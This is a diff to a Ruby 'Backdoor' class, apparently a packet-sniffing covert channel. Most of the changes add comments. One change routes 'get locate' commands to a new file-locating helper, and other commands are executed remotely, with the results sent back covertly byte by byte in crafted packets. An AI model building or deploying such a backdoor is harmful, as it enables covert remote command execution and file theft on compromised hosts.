@@ -13,6 +13,7 @@ require curdir + '/commands.rb'
 # Backdoor
 #
 # Author: Karl Castillo
+#
 # Date: November 20, 2012
 #
 # Notes:
@@ -27,7 +28,11 @@ class Backdoor
     # initialize
     #
     # Author: Karl Castillo
+    #
     # Date: November 20, 2012
+    #
+    # Arguments:
+    # start - determines whether the sniffing must be started or not (default: false)
     #
     # Notes:
     # Initializes the Backdoor class. This is where all the necessary arguments
@@ -48,6 +53,7 @@ class Backdoor
     # listen
     #
     # Author: Karl Castillo
+    #
     # Date: November 20, 2012
     #
     # Notes:
@@ -78,7 +84,11 @@ class Backdoor
     # process_packet
     #
     # Author: Karl Castillo
+    #
     # Date: November 20, 2012
+    #
+    # Arguments:
+    # packet - the packet received
     #
     # Notes:
     # Processes packets, determines whether or not it's the last packet or part
@@ -90,7 +100,11 @@ class Backdoor
             if packet.tcp_flags.fin == 1 then
                 cmd = @command.split(' ')
                 if cmd[0] == "get" then
-                    send_data(get_command(cmd[1], cmd[2]), packet)
+                    if cmd[1] == "locate" then
+                        send_data(get_locate_command(cmd[2]), packet)
+                    else # cmd[1]
+                        send_data(get_command(cmd[1]), packet)
+                    end # cmd[1] else
                 else # cmd[0]
                     puts @command
                     send_data(run_command(@command), packet)
@@ -110,7 +124,12 @@ class Backdoor
     # send_data
     #
     # Author: Karl Castillo
+    #
     # Date: November 20, 2012
+    #
+    # Arguments:
+    # data - the data that will be sent covertly
+    # packet - the packet received where necessary fields will be extracted from
     #
     # Notes:
     # Sends data to the client byte-by-byte and the fin packets to signify
@@ -151,5 +170,5 @@ class Backdoor
         
         tcp_fin.recalc
         tcp_fin.to_w(@iface)
-    end
-end
+    end # send_data
+end # Backdoor
